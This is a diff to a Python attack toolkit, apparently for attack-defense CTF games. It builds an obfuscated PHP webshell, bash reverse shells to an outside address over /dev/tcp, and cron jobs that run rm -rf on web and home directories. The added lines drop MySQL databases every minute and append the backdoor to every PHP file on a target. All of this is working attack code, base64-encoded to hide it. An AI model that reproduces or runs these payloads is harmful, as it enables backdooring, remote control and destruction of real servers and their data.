@@ -167,7 +167,7 @@ def upload_and_execute(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
-def generate_shell(target,target_port,cmd):
+def generate_shell(target,target_port,cmd,shell_type=2):
     shell_name,shell_arg = shell_hash(target,target_port)
     if shell_type==1: 
 	shell = '<?php if($_REQUEST[hash]=="%s"){$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);}?>'%shell_arg
@@ -199,10 +199,19 @@ def test_vul(target,target_port,cmd):
     return "/bin/echo hell0W0r1d"
 
 def rm_file_index(target,target_port,cmd):
-    return "/bin/rm " + " -rf /var/www/html/index.php"
+    return "/bin/rm " + " -rf %s"%rm_index
 
 def rm_file(target,target_port,cmd):
-    return "/bin/rm " + " -rf /var/www/html"
+    return "/bin/rm " + " -rf %s"%rm_paths
+
+def rm_db(target,target_port,cmd):
+    cmd = "/usr/bin/mysql -u%s -p%s -e '"%(db_user,db_passwd)
+    for db in db_name:
+	cmd += "drop database %s;"%db
+    cmd += "'"
+    print cmd
+    return cmd	
+	
 
 def reverse_shell(target,target_port,cmd):
     cmd = '/bin/bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
@@ -210,6 +219,14 @@ def reverse_shell(target,target_port,cmd):
     cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/bash'%cmd
     debug_print(cmd)
     return cmd
+
+def crontab_rm_db(target,target_port,cmd):
+    cmd = rm_db(target,target_port,cmd)
+    crontab_cmd = '* * * * * bash -c "%s"\n'%cmd
+    encode_crontab_cmd = base64.b64encode(crontab_cmd)
+    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf"+ " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
+    debug_print(cmd)
+    return cmd 
 
 def crontab_reverse(target,target_port,cmd):
     cmd = 'bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
@@ -220,7 +237,7 @@ def crontab_reverse(target,target_port,cmd):
     return cmd 
 
 def crontab_rm(target,target_port,cmd):
-    cmd = '/bin/rm -rf /tmp/* /home/* /var/www/html/*'
+    cmd = '/bin/rm -rf %s'%rm_paths
     crontab_cmd = "* * * * * %s\n"%cmd
     encode_crontab_cmd = base64.b64encode(crontab_cmd)
     cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
@@ -264,5 +281,14 @@ def crontab_clean(target,target_port,cmd):
     debug_print(cmd)
     return cmd
     
+def batch_backdoor(target,target_port,cmd):
+    shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,1)
+    # We use the bash script to add the batch backdoor, because we add the bd at the end of the file, we'd better add the ?> with it
+    cmd = 'function read_dir(){ for file in `ls $1`;do if [ -d $1"/"$file ];then read_dir $1"/"$file;else echo $1"/"$file;fi;done };read_dir %s | grep .php | xargs sed -i \'$a\%s\''%(web_path,"?>" + shell)
+    print cmd
+    cmd = base64.b64encode(cmd)
+    cmd = "/bin/echo %s | /usr/bin/base64 -d | /bin/bash"%cmd
+    debug_print(cmd)
+    return cmd
 
 
